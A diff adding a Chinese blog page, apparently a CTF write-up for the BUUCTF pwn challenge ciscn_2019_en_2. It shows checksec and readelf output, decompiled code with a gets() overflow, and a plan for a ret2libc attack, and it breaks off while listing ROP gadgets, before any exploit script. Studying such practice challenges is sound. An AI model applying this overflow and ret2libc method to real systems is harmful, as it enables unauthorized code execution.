@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html
+  lang="zh"
+  dir="ltr"
+  
+><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>【LibSearcher】ciscn_2019_en_2 - Peter Liu的个人博客</title>
+
+<meta name="generator" content="Hugo Eureka 0.9.3" />
+<link rel="stylesheet" href="https://peterliuzhi.top/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
+<script defer src="https://peterliuzhi.top/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto&#43;Serif&#43;SC:wght@400;600;700&amp;display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js"
+   crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js"
+     crossorigin></script>
+<link rel="stylesheet" href="https://peterliuzhi.top/css/highlightjs.min.0e3b6ac4177cdecae52d1b2de76aa7a0ce8a92e4cc23ef2f8691f0218a25f5d328e14bf47be023009535efe940980954.css" media="print" onload="this.media='all';this.onload=null">
+
+
+
+<script src="https://kit.fontawesome.com/99649a0b4d.js" crossorigin="anonymous"></script>
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"
+   integrity="sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js" 
+  integrity="sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js"
+   integrity="sha384-&#43;XBljXPPiv&#43;OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js" 
+  integrity="sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0"  crossorigin></script>
+
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_32x32_fill_q75_box_center.jpg">
+<link rel="apple-touch-icon" sizes="180x180" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_180x180_fill_q75_box_center.jpg">
+
+<meta name="description"
+  content="BUUCTF ciscn_2019_en_2的解析">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Writeups",
+      "item":"https://peterliuzhi.top/writeup/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"【LibSearcher】ciscn_2019_en_2",
+      "item":"https://peterliuzhi.top/writeup/libsearcherciscn_2019_en_2/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://peterliuzhi.top/writeup/libsearcherciscn_2019_en_2/"
+    },
+    "headline": "【LibSearcher】ciscn_2019_en_2 - Peter Liu的个人博客","datePublished": "2022-12-29T03:01:44+08:00",
+    "dateModified": "2022-12-29T03:01:44+08:00",
+    "wordCount":  1682 ,
+    "publisher": {
+        "@type": "Person",
+        "name": "Peter Liu",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://peterliuzhi.top/images/selficon.jpg"
+        }
+        },
+    "description": "BUUCTF ciscn_2019_en_2的解析"
+}
+</script><meta property="og:title" content="【LibSearcher】ciscn_2019_en_2 - Peter Liu的个人博客" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="https://peterliuzhi.top/images/selficon.jpg">
+
+
+<meta property="og:url" content="https://peterliuzhi.top/writeup/libsearcherciscn_2019_en_2/" />
+
+
+
+<meta property="og:description" content="BUUCTF ciscn_2019_en_2的解析" />
+
+
+
+<meta property="og:locale" content="zh" />
+
+
+
+
+<meta property="og:site_name" content="Peter Liu的个人博客" />
+
+
+
+
+
+
+<meta property="article:published_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+<meta property="article:modified_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+
+<meta property="article:section" content="writeup" />
+
+
+<meta property="article:tag" content="pwn" />
+
+<meta property="article:tag" content="LibSearcher" />
+
+
+
+
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" />
+
+
+
+
+  <body class="flex min-h-screen flex-col">
+    <header
+      class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"
+    >
+      <div class="mx-auto w-full max-w-screen-xl"><style>
+.search-container {
+  margin-top: -0.3rem;
+  margin-right: 1rem;
+}
+.search-container .search {
+  border: 1px solid #e2e8f0;
+  border-radius: 4px;
+}
+.search-container input {
+  padding-left: 1rem;
+  line-height: 2rem;
+  outline: none;
+  background: transparent;
+}
+.search-container button {
+  font-size: 0.8rem;
+  margin-right: 0.5rem;
+  color: #e2e8f0;
+}
+</style>
+<script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
+        document.getElementsByTagName('html')[0].classList.add('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="me-6 text-primary-text text-xl font-bold">Peter Liu的个人博客</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div id="target"
+        class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">About</a>
+            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Posts</a>
+            <a href="/writeup/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  me-4">WriteUp</a>
+            <a href="/tricks/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Tricks</a>
+            <a href="/archive/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Archive</a>
+        </div>
+
+        <div class="flex">
+            <div class="search-container relative pt-4 md:pt-0">
+                <div class="search">
+                    <form role="search" class="search-form" action="/search.html" method="get">
+                    <label>
+                        <input name="q" type="text" placeholder="搜索 ..." class="search-field">
+                    </label>
+                    <button>
+                        <i class="fa-solid fa-magnifying-glass"></i>
+                    </button>
+                    </form>
+                </div>
+            </div>
+
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-adjust"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">浅色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">深色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">自动</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == null || storageColorScheme == 'Auto') {
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    } else if (storageColorScheme == "Dark") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'moon')
+        element.firstElementChild.classList.add('fa-moon')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+    </header>
+    <main class="grow pt-16">
+        <div class="pl-scrollbar">
+          <div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8">
+  
+  
+  <div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12">
+    <div
+      class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
+    >
+      <article class="prose">
+  <h1 class="mb-4">【LibSearcher】ciscn_2019_en_2</h1>
+
+  <div
+  class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
+>
+  <div class="me-6 my-2">
+    <i class="fas fa-calendar me-1"></i>
+    <span
+      >Thursday, December 29, 2022</span
+    >
+  </div>
+  <div class="me-6 my-2">
+    <i class="fas fa-clock me-1"></i>
+    <span>4分钟阅读时长</span>
+  </div>
+
+  
+    <div class="me-6 my-2">
+      <i class="fas fa-folder me-1"></i>
+      
+        <a href="https://peterliuzhi.top/categories/writeup/" class="hover:text-eureka"
+          >writeup</a
+        >
+      
+    </div>
+  
+
+  
+</div>
+
+
+  
+  
+
+  <h1 id="write-upbuuctf-ciscn_2019_en_2">【Write-up】BUUCTF ciscn_2019_en_2</h1>
+<p><a href="https://buuoj.cn/challenges#ciscn_2019_en_2">原题链接</a>和<a href="https://buuoj.cn/challenges#ciscn_2019_c_1">这道题</a>是一道题，一模一样的</p>
+<ul>
+<li><a href="#write-upbuuctf-ciscn_2019_en_2">【Write-up】BUUCTF ciscn_2019_en_2</a>
+<ul>
+<li><a href="#checksec-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E6%9E%B6%E6%9E%84">checksec 查看程序架构</a></li>
+<li><a href="#ida-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E4%BC%AA%E4%BB%A3%E7%A0%81">ida 查看程序伪代码</a></li>
+<li><a href="#%E6%9E%84%E5%BB%BA-exp">构建 exp</a>
+<ul>
+<li><a href="#%E5%AE%8C%E6%95%B4-exp">完整 exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="checksec-查看程序架构">checksec 查看程序架构</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ checksec --file ciscn_2019_en_2
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/peterl/security/workspace/ciscn_2019_en_2/ciscn_2019_en_2&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span></code></pre></div><p>64 位程序，不能用 shellcode</p>
+<p>再用<code>readelf</code>命令看一下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ readelf -r ciscn_2019_en_2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">重定位节 <span class="s1">&#39;.rela.dyn&#39;</span> at offset 0x538 contains <span class="m">4</span> entries:
+</span></span><span class="line"><span class="cl">  偏移量          信息           类型           符号值        符号名称 + 加数
+</span></span><span class="line"><span class="cl">000000601ff8  <span class="m">000800000006</span> R_X86_64_GLOB_DAT <span class="m">0000000000000000</span> __gmon_start__ + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602080</span>  000d00000005 R_X86_64_COPY     <span class="m">0000000000602080</span> stdout@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602090</span>  000e00000005 R_X86_64_COPY     <span class="m">0000000000602090</span> stdin@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl">0000006020a0  000f00000005 R_X86_64_COPY     00000000006020a0 stderr@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">重定位节 <span class="s1">&#39;.rela.plt&#39;</span> at offset 0x598 contains <span class="m">11</span> entries:
+</span></span><span class="line"><span class="cl">  偏移量          信息           类型           符号值        符号名称 + 加数
+</span></span><span class="line"><span class="cl"><span class="m">000000602018</span>  <span class="m">000100000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> _exit@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602020</span>  <span class="m">000200000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> puts@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602028</span>  <span class="m">000300000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> strlen@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602030</span>  <span class="m">000400000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> alarm@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602038</span>  <span class="m">000500000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> __libc_start_main@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602040</span>  <span class="m">000600000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> getchar@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602048</span>  <span class="m">000700000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> signal@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602050</span>  <span class="m">000900000007</span> R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> gets@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602058</span>  000a00000007 R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> fflush@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602060</span>  000b00000007 R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> setvbuf@GLIBC_2.2.5 + <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="m">000000602068</span>  000c00000007 R_X86_64_JUMP_SLO <span class="m">0000000000000000</span> __isoc99_scanf@GLIBC_2.7 + <span class="m">0</span>
+</span></span></code></pre></div><p>发现没有<code>system</code>，可能就是 ret2libc 了</p>
+<h2 id="ida-查看程序伪代码">ida 查看程序伪代码</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;EEEEEEE                            hh      iii                &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;====================================================================&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to this Encryption machine</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">begin</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">fflush</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;I think you can do it by yourself&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">begin</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Bye!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">encrypt</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">begin</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Something Wrong!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这一大堆杂乱的代码我们花一点时间去分析就会发现，只有当第一次输入的选项是 1 的时候，才会进入<code>encrypt</code>函数，而这个函数的伪 C 代码为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">encrypt</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int16</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-20h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Input your Plaintext to be encrypted&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&gt;=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">96</span> <span class="o">||</span> <span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">122</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">64</span> <span class="o">||</span> <span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">90</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">47</span> <span class="o">&amp;&amp;</span> <span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">57</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xCu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xDu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xEu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">++</span><span class="n">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Ciphertext&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这代码也是乱得不得了，和神经病发癫一样。但是其实那一大串<code>while</code>里面的代码都可以通过这一句来跳过去：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">x</span><span class="p">;</span> <span class="c1">// v0 &gt;= 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&gt;=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>如果我们让<code>s</code>的第一个字符为<code>\0</code>的话，那么它<code>strlen</code>后的值就始终为 0，<code>v0</code>始终大于等于<code>s</code>的长度，那么就能直接跳出循环，不用进行下面那一大串操作。</p>
+<p>我们又看到输入函数为<code>gets</code>，这说明可以栈溢出，同时程序又有<code>puts</code>函数，我们就能得到<code>libc</code>的基址，从而计算出<code>system</code>的真实地址</p>
+<h2 id="构建-exp">构建 exp</h2>
+<p>先把<code>ret</code>和<code>pop rdi;ret</code>这两个 gadget 准备好：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ROPgadget --binary ciscn_2019_en_2 --only <span class="s2">&#34;pop|ret&#34;</span>
+</span></span><span class="line"><span class="cl">Gadgets <span class="nv">information</span>
+</span></span><span class="line"><span class="cl"><span class="o">============================================================</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">0x0000000000400c83 : pop rdi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">...
